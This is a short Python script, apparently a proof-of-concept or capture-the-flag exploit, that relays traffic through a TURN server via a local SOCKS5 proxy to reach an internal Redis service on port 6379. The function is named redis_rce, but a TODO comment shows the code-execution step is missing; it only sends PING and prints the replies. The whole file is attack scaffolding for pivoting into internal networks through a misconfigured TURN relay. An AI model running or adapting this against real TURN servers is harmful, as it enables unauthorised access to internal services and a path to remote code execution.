from turnproxy import SocksIn
import asyncio
import aiosocks
import sys

HOST = '172.17.0.3'
PORT = 3478

async def redis_rce():
    dst = ('0.0.0.0', 6379)
    socks5_addr = aiosocks.Socks5Addr('127.0.0.1', 1337)
    reader, writer = await aiosocks.open_connection(proxy=socks5_addr, proxy_auth=None, dst=dst, remote_resolve=False)

    # TODO: actually throw RCE
    writer.write(b'PING\n')
    while True:
        sys.stdout.write((await reader.read(1)).decode('utf-8'))

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    server = loop.run_until_complete(loop.create_server(
        lambda: SocksIn(
            HOST,  # TURN IP
            PORT,  # TURN port
            b'',   # username
            b'',   # password
        ),
        host='127.0.0.1',  # socks bind host
        port=1337,  # socks bind port
    ))

    loop.run_until_complete(redis_rce())
    server.close()
